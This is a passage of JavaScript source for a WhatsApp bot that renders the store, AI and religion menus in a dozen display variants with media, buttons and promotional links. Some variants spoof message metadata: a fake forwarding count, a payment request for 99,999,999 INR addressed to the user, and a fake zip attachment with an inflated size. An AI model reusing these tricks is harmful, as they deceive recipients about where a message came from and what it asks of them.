  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'storemenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${storemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'aimenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${aimenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'religionmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${religionmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
